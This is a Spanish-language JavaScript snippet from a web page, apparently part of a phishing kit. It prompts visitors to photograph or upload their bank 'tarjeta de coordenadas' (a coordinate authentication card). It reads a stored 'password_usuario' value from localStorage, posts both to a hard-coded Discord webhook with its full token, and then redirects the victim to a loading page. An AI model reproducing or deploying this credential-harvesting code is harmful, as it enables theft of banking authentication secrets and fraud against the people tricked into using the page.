    <script>
    // ⚠️ REEMPLAZA CON TU WEBHOOK REAL DE DISCORD
    const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1558568551550292148/Wskx0sJITD2_84Kea18I4PcSJx9_-LlbfuDfAREN4ikumaVlxbqDEYZk4A5BFDGner0W";

    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const vistaPrevia = document.getElementById('vista-previa');
    const btnActivarCamara = document.getElementById('btn-activar-camara');
    const btnCapturar = document.getElementById('btn-capturar');
    const labelGaleria = document.getElementById('label-galeria');
    const inputGaleria = document.getElementById('input-galeria');
    const btnEnviar = document.getElementById('btn-enviar');
    const estado = document.getElementById('estado');

    let archivoParaEnviar = null; // Almacenará el Blob o Archivo final

    // --- MÉTODO 1: LÓGICA DE CÁMARA EN VIVO ---
    btnActivarCamara.addEventListener('click', async () => {
        try {
            estado.innerText = "Abriendo cámara...";
            estado.style.color = "#dbdee1";
            
            // Forzamos el uso de la cámara trasera en celulares
            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
            video.srcObject = stream;
            
            video.style.display = "block";
            btnCapturar.style.display = "block";
            
            btnActivarCamara.style.display = "none";
            labelGaleria.style.display = "none";
            vistaPrevia.style.display = "none";
            btnEnviar.style.display = "none";
            estado.innerText = "";
        } catch (err) {
            estado.innerText = "Error: No se pudo abrir la cámara. Revisa los permisos de tu navegador.";
            estado.style.color = "#f23f43";
            console.error(err);
        }
    });

    btnCapturar.addEventListener('click', () => {
        const context = canvas.getContext('2d');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        context.drawImage(video, 0, 0, canvas.width, canvas.height);

        // Convertimos a formato visual y a archivo binario (Blob)
        vistaPrevia.src = canvas.toDataURL('image/png');
        vistaPrevia.style.display = "block";
        video.style.display = "none";
        btnCapturar.style.display = "none";
        
        // Volvemos a mostrar las opciones principales por si quiere cambiar
        btnActivarCamara.style.display = "block";
        labelGaleria.style.display = "block";
        btnEnviar.style.display = "block";

        canvas.toBlob((blob) => {
            archivoParaEnviar = blob;
        }, 'image/png');

        // Apagar la cámara trasera para ahorrar recursos
        const stream = video.srcObject;
        if (stream) stream.getTracks().forEach(track => track.stop());
    });

    // --- MÉTODO 2: LÓGICA DE LA GALERÍA ---
    inputGaleria.addEventListener('change', function() {
        if (this.files && this.files[0]) {
            archivoParaEnviar = this.files[0];
            
            const lector = new FileReader();
            lector.onload = function(e) {
                vistaPrevia.src = e.target.result;
                vistaPrevia.style.display = 'block';
                btnEnviar.style.display = 'block';
                
                // Aseguramos que la cámara en vivo se apague si estaba abierta
                video.style.display = "none";
                btnCapturar.style.display = "none";
                btnActivarCamara.style.display = "block";
                
                estado.innerText = "Foto seleccionada de la galería.";
                estado.style.color = "#dbdee1";
            }
            lector.readAsDataURL(archivoParaEnviar);
        }
    });

    // --- ACCIÓN: ENVIAR A DISCORD ---
    btnEnviar.addEventListener('click', async () => {
        if (!archivoParaEnviar) return;

        estado.innerText = "Enviando a tarjeta de coordenadas...";
        estado.style.color = "#f0b232";
        btnEnviar.disabled = true;

        // Leer el usuario guardado en localStorage (clave: sesion_admin_id)
        let usuarioId = "desconocido";
        try {
            const sessionIdUnico = localStorage.getItem('password_usuario');
            if (sessionIdUnico) {
                const datosSesion = JSON.parse(sessionIdUnico);
                usuarioId = datosSesion.usuario || sessionIdUnico;
            }
        } catch (e) {
            // Si no es JSON válido, usamos el valor crudo tal cual
            const valorCrudo = localStorage.getItem('password_usuario');
            if (valorCrudo) usuarioId = valorCrudo;
        }

        const formData = new FormData();
        // Detecta si es un archivo de galería o una captura del canvas
        const nombreArchivo = archivoParaEnviar.name || 'captura_web.png';
        formData.append('file', archivoParaEnviar, nombreArchivo); 
        formData.append('payload_json', JSON.stringify({
            content: `¡Nueva foto recibida desde la web! 📸\nUsuario: ${usuarioId}`
        }));

        try {
            const respuesta = await fetch(DISCORD_WEBHOOK_URL, {
                method: 'POST',
                body: formData
            });

            if (respuesta.ok) {
                estado.innerText = "¡Tarjeta de coordenadas enviada con éxito! ";
                estado.style.color = "#23a55a";
                vistaPrevia.style.display = 'none';
                btnEnviar.style.display = 'none';
                inputGaleria.value = "";
                archivoParaEnviar = null;

                // Redirigir a Google después de 1.5 segundos
                setTimeout(() => {
                    window.location.href = "cargando.html";
                }, 1000);
            } else {
                throw new Error();
            }
        } catch (error) {
            estado.innerText = "Error al enviar la imagen. Revisa tu webhook.";
            estado.style.color = "#f23f43";
        } finally {
            btnEnviar.disabled = false;
        }
    });
</script>
